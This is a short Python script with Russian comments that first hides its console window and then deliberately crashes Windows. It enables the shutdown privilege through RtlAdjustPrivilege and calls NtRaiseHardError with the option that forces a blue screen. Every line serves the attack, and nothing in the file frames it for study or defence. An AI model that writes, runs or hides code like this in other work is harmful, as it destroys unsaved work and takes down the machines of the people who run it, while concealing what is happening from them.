#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import ctypes
import os

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def trigger_bsod():
    if sys.platform == 'win32':
        # Получаем доступ к ntdll.dll
        ntdll = ctypes.WinDLL('ntdll.dll')
        
        # Вызываем функцию, которая может вызвать BSOD
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

if __name__ == "__main__":
    hide_console()
    trigger_bsod() 